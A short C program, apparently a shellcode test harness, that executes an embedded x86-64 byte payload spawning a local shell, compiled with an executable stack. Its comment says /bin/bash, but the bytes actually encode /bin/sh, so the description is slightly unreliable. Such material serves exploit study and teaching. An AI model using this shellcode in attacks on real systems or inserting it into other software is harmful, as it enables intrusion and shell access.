#include<stdio.h>
#include<string.h>

// Shellcode to execve("/bin/bash", {NULL}, {NULL})
// Compile with the following: gcc -z execstack shellcode.c
int main(int argc, char **argv) {
  unsigned char code[] = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05";
  int foo_value = 0;

  int (*foo)() = (int(*)())code;
  foo_value = foo();

  printf("%d\n", foo_value);
}
